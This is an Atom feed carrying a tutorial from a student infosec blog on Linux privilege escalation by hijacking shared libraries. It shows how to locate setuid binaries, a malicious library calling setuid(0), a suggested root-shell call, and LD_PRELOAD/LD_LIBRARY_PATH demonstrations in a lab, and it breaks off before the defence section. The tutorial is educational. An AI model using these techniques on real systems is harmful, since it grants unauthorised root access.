<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-11-26T17:57:30+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">BoiteAKlou’s Infosec Blog</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">Linux Privilege Escalation: Abusing shared libraries</title><link href="http://localhost:4000/Abusing-Shared-Libraries.html" rel="alternate" type="text/html" title="Linux Privilege Escalation: Abusing shared libraries" /><published>2018-11-21T13:00:00+01:00</published><updated>2018-11-21T13:00:00+01:00</updated><id>http://localhost:4000/Abusing-Shared-Libraries</id><content type="html" xml:base="http://localhost:4000/Abusing-Shared-Libraries.html">&lt;p&gt;Linux applications often use dynamically linked shared object libraries. These libraries allow code flexbility but they have their drawbacks… &lt;span style=&quot;color:Maroon&quot;&gt;In this article, we will study the weaknesses of shared libraries and how to exploit them in many different ways.&lt;/span&gt; Each exploit will be illustrated by a concrete example, which should make you understand how to reproduce it. I’ll give recommandations on how to protect your system against it in the final part of the article.
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#shared-libraries-in-short&quot; id=&quot;markdown-toc-shared-libraries-in-short&quot;&gt;Shared Libraries in short&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#dynamic-linking-in-linux&quot; id=&quot;markdown-toc-dynamic-linking-in-linux&quot;&gt;Dynamic Linking in Linux&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#find-a-vulnerable-application&quot; id=&quot;markdown-toc-find-a-vulnerable-application&quot;&gt;Find a vulnerable application&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#but-can-we-exploit-it&quot; id=&quot;markdown-toc-but-can-we-exploit-it&quot;&gt;But can we exploit it?&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#1-write-permissions-on-lib-or-usrlib&quot; id=&quot;markdown-toc-1-write-permissions-on-lib-or-usrlib&quot;&gt;1. Write permissions on /lib or /usr/lib&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-ld_preload-and-ld_library_path&quot; id=&quot;markdown-toc-2-ld_preload-and-ld_library_path&quot;&gt;2. LD_PRELOAD and LD_LIBRARY_PATH&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#ld_preload&quot; id=&quot;markdown-toc-ld_preload&quot;&gt;LD_PRELOAD&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#ld_library_path&quot; id=&quot;markdown-toc-ld_library_path&quot;&gt;LD_LIBRARY_PATH&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#3-setuid-bit-on-ldconfig&quot; id=&quot;markdown-toc-3-setuid-bit-on-ldconfig&quot;&gt;3. Setuid bit on ldconfig&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#alternative-to-etcldsoconf&quot; id=&quot;markdown-toc-alternative-to-etcldsoconf&quot;&gt;Alternative to /etc/ld.so.conf&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#how-can-we-defend-against-this&quot; id=&quot;markdown-toc-how-can-we-defend-against-this&quot;&gt;How can we defend against this?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 class=&quot;no_toc&quot; id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;

&lt;p&gt;I won’t describe here the full details of how libraries work in Linux, my goal is to give you the necessary amount of information so you can understand the exploit and be able to reproduce it.&lt;/p&gt;

&lt;h2 id=&quot;shared-libraries-in-short&quot;&gt;Shared Libraries in short&lt;/h2&gt;

&lt;p&gt;A library is &lt;strong&gt;a file containing data or compiled code&lt;/strong&gt; that is used by developpers to avoid re-writing the same pieces of code you use in mutiple programs (modular programming). It can contain classes, methods or data structures and will be linked to the program that will use it at the compilation time.&lt;/p&gt;

&lt;p&gt;There are different types of libraries in Linux:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Static libraries (&lt;strong&gt;.a&lt;/strong&gt; extension)&lt;/li&gt;
  &lt;li&gt;Dynamically linked shared object libraries (&lt;strong&gt;.so&lt;/strong&gt; extension)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Static libraries will become part of the application so they will be &lt;strong&gt;unalterable&lt;/strong&gt; once the compilation done. Every running program has its own copy of the library, which won’t be interesting for us.&lt;/p&gt;

&lt;p&gt;Dynamic libraries can be used in two ways:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Dynamic linking (dynamically linked at run time).&lt;/li&gt;
  &lt;li&gt;Dynamic loading (dynamiclly loaded and user under program control).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;They seem much more attractive because of their dynamic nature. If we manage to &lt;strong&gt;alterate the content of a dynamic library&lt;/strong&gt;, we should be able to control the execution of the calling program and that’s what we want!&lt;/p&gt;

&lt;p&gt;For that reason, we will focus on &lt;strong&gt;dynamic linking&lt;/strong&gt; in this article.&lt;/p&gt;

&lt;h2 id=&quot;dynamic-linking-in-linux&quot;&gt;Dynamic Linking in Linux&lt;/h2&gt;

&lt;p&gt;Since these libraries are dynamically linked to the program, we have to specify their location so the Operating System will know where to look for when the program is executed.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ld&lt;/code&gt; is the GNU linker. Its man page gives us the following methods for specifying the location of dynamic libraries:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Using &lt;strong&gt;-rpath&lt;/strong&gt; or &lt;strong&gt;-rpath-link&lt;/strong&gt; options when compiling the application.&lt;/li&gt;
  &lt;li&gt;Using the environment variable &lt;strong&gt;LD_RUN_PATH&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Using the environment variable &lt;strong&gt;LD_LIBRARY_PATH&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Using the value of &lt;strong&gt;DT_RUNPATH&lt;/strong&gt; or &lt;strong&gt;DT_PATH&lt;/strong&gt;, set with &lt;strong&gt;-rpath&lt;/strong&gt; option.&lt;/li&gt;
  &lt;li&gt;Putting libraries in default &lt;strong&gt;/lib&lt;/strong&gt; and &lt;strong&gt;/usr/lib&lt;/strong&gt; directories.&lt;/li&gt;
  &lt;li&gt;Specifying a directory containing our libraries in &lt;strong&gt;/etc/ld.so.conf&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;span style=&quot;color:red&quot;&gt;As an attacker, our objective is to control one of these methods in order to replace an existing dynamic library by a malicious one.&lt;/span&gt; By default, security measures have been put in place in Linux. However, we will see that there are so many ways to make this exploit possible…&lt;/p&gt;

&lt;h2 id=&quot;find-a-vulnerable-application&quot;&gt;Find a vulnerable application&lt;/h2&gt;

&lt;p&gt;Since we want to escalate privileges, it is mandatory to find an executable file with &lt;strong&gt;setuid bit&lt;/strong&gt; enable. This bit allows anyone to execute the program with the same permissions as the file’s owner.&lt;/p&gt;

&lt;p&gt;We can find those files using the following command:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s 2&amp;gt;/dev/null | xargs &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We combine it to &lt;code class=&quot;highlighter-rouge&quot;&gt;ls -l&lt;/code&gt; so we can check that the file’s owner is root.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~/Abusing-Shared-Libraries&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s 2&amp;gt;/dev/null | xargs &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        30112 Jul 12  2016 /bin/fusermount
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        34812 May 16  2018 /bin/mount
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root       157424 Jan 28  2017 /bin/ntfs-3g
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        38932 May  7  2014 /bin/ping
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        43316 May  7  2014 /bin/ping6
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        38900 May 17  2017 /bin/su
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        26492 May 16  2018 /bin/umount
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root   root          387 Jan 15  2018 /sbin/ldconfig
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root   root       831936 Jan 15  2018 /sbin/ldconfig.real
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 daemon daemon      50748 Jan 14  2016 /usr/bin/at
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        48264 May 17  2017 /usr/bin/chfn
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        39560 May 17  2017 /usr/bin/chsh
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        78012 May 17  2017 /usr/bin/gpasswd
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root   root         7376 Nov 18 22:03 /usr/bin/myexec      &lt;span class=&quot;c&quot;&gt;# Hmm... suspicious&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        36288 May 17  2017 /usr/bin/newgidmap
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        34680 May 17  2017 /usr/bin/newgrp
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        36288 May 17  2017 /usr/bin/newuidmap
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        53128 May 17  2017 /usr/bin/passwd
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        18216 Jul 13 15:47 /usr/bin/pkexec
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root       159852 Jul  4  2017 /usr/bin/sudo
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr--&lt;/span&gt; 1 root   messagebus  46436 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root         5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        42396 Jun 14  2017 /usr/lib/i386-linux-gnu/lxc/lxc-user-nic
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root       513528 Jan 18  2018 /usr/lib/openssh/ssh-keysign
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root   root        13960 Jul 13 15:47 /usr/lib/policykit-1/polkit-agent-helper-1
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root   root       105004 Jul 19 13:22 /usr/lib/snapd/snap-confine
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/myexec&lt;/code&gt; has the setuid bit enabled and is owned by root. &lt;em&gt;(By the way, this specific program caught our attention because it’s the only unknown program of the list. If you have any doubt on an application, google should help you find out if it’s a regular linux application or not.)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Is there any chance that &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/myexec&lt;/code&gt; uses &lt;strong&gt;shared objects&lt;/strong&gt;?
Let’s check this with &lt;code class=&quot;highlighter-rouge&quot;&gt;ldd&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~/Abusing-Shared-Libraries&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /usr/bin/myexec
	linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb779b000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	libcustom.so &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /usr/lib/libcustom.so &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb778e000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;# Looks like a custom library&lt;/span&gt;
	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb75d8000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	/lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb779c000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see &lt;strong&gt;libcustom.so&lt;/strong&gt;, which looks pretty custom (Oh really?). This executable file gathers all the pre-requisites. &lt;span style=&quot;color:red&quot;&gt;However, we still need to find a way to inject our malicious dynamic library.&lt;/span&gt;&lt;/p&gt;

&lt;h2 id=&quot;but-can-we-exploit-it&quot;&gt;But can we exploit it?&lt;/h2&gt;

&lt;p&gt;As always when it comes to privilege escalation, &lt;strong&gt;everything starts from a misconfiguration&lt;/strong&gt;.
From the moment we find a setuid file using shared objects, there are at least 4 possible misconfigurations that could lead to privilege escalation. I’ll detail here the three working exploits that I’ve already seen on a machine. To those detailed below, you can add the &lt;strong&gt;RPATH&lt;/strong&gt; technique, which is very similar to the second method I present: LD_PRELOAD and LD_LIBRARY_PATH.&lt;/p&gt;

&lt;p&gt;For the need of the examples you’ll find below, I’ve created the setuid ELF executable &lt;strong&gt;myexec&lt;/strong&gt; linked with the dynamic library &lt;strong&gt;libcustom.so&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;# myexec.c
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &quot;libcustom.h&quot;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Welcome to my amazing application!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;say_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;# libcustom.c
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;say_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello buddy!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But also an evil library that we will try to inject in place of the real libcustom.so:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;# evil libcustom.c
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;say_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I'm the bad library&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This one is only printing a different output but be sure that if we manage to execute this code, we could obviously pop a shell with &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;,NULL,NULL);&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now let’s see which configuration mistakes we could exploit…&lt;/p&gt;

&lt;h3 id=&quot;1-write-permissions-on-lib-or-usrlib&quot;&gt;1. Write permissions on /lib or /usr/lib&lt;/h3&gt;

&lt;p&gt;Even though this one seems pretty unlikely, it could happen that a user has &lt;strong&gt;write permissions&lt;/strong&gt; on one these folders.
In that case, the attacker could easily &lt;strong&gt;craft a malicious libcustom library&lt;/strong&gt; and place it into &lt;strong&gt;/lib&lt;/strong&gt; or &lt;strong&gt;/usr/lib&lt;/strong&gt;. Of course, he would have deleted the original library first.&lt;/p&gt;

&lt;p&gt;When executing &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/myexec&lt;/code&gt;, &lt;span style=&quot;color:red&quot;&gt;the malicious library will be called instead.&lt;/span&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-ld_preload-and-ld_library_path&quot;&gt;2. LD_PRELOAD and LD_LIBRARY_PATH&lt;/h3&gt;

&lt;p&gt;I decided to present this technique as it’s a must-known, even though it won’t work in our case :laughing:. Let me explain why.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;LD_LIBRARY_PATH&lt;/strong&gt; and &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; are environment variables. The first one allows you to indicate an &lt;strong&gt;additionnal directory to search for libraries&lt;/strong&gt; and the second specifies a library &lt;span style=&quot;color:red&quot;&gt;which will be loaded prior to any other library when the program gets executed.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;These variables modify the environment of the current user, but when you execute a setuid program, it is done in the context of the owner, which hasn’t necessarily set LD_LIBRARY_PATH or LD_PRELOAD. Let me show you an example.&lt;/p&gt;

&lt;p&gt;I’ve created 2 executables: 1 with setuid bit enabled and 1 without.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~/Abusing-Shared-Libraries&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /usr/bin/myexec&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root root 7376 Nov 18 22:03 /usr/bin/myexec	&lt;span class=&quot;c&quot;&gt;# Setuid&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root root 7376 Nov 19 20:18 /usr/bin/myexec2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;ld_preload&quot;&gt;LD_PRELOAD&lt;/h4&gt;

&lt;p&gt;Using the &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; technique with the evil library on &lt;strong&gt;myexec2&lt;/strong&gt; (without setuid bit), we have the following output:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~/Abusing-Shared-Libraries&lt;span class=&quot;nv&quot;&gt;$ LD_PRELOAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/evil/libcustom.so /usr/bin/myexec2
Welcome to my amazing application!
I&lt;span class=&quot;s1&quot;&gt;'m the bad library
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the same technique on &lt;strong&gt;myexec&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~/Abusing-Shared-Libraries&lt;span class=&quot;nv&quot;&gt;$ LD_PRELOAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/evil/libcustom.so /usr/bin/myexec
Welcome to my amazing application!
Hello buddy!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that &lt;span style=&quot;color:ForestGreen&quot;&gt;it’s working when the setuid bit isn’t enabled&lt;/span&gt; for the reasons explained above.&lt;/p&gt;

&lt;h4 id=&quot;ld_library_path&quot;&gt;LD_LIBRARY_PATH&lt;/h4&gt;

&lt;p&gt;Let’s check the behavior of &lt;strong&gt;myexec&lt;/strong&gt; and &lt;strong&gt;myexec2&lt;/strong&gt; when using LD_LIBRARY_PATH:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;LD_LIBRARY_PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/evil/
boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /usr/bin/myexec
	linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb770f000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	libcustom.so &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /tmp/evil/libcustom.so &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7708000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;			&lt;span class=&quot;c&quot;&gt;# !!!&lt;/span&gt;
	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb754c000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	/lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7710000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /usr/bin/myexec2
	linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb77a1000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	libcustom.so &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /tmp/evil/libcustom.so &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb779a000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;			&lt;span class=&quot;c&quot;&gt;# !!!&lt;/span&gt;
	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb75de000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	/lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb77a2000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that the &lt;strong&gt;libcustom.so&lt;/strong&gt; linked with these two programs is the evil one. However, when we run them, we have the following output:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/myexec
Welcome to my amazing application!
Hello buddy!

boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/myexec2
Welcome to my amazing application!
I&lt;span class=&quot;s1&quot;&gt;'m the bad library
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;span style=&quot;color:ForestGreen&quot;&gt;Certain security measures have been put in place to avoid this kind of exploits&lt;/span&gt; but there was a time where it was possible and I think this is a pretty interesting mechanism to understand.&lt;/p&gt;

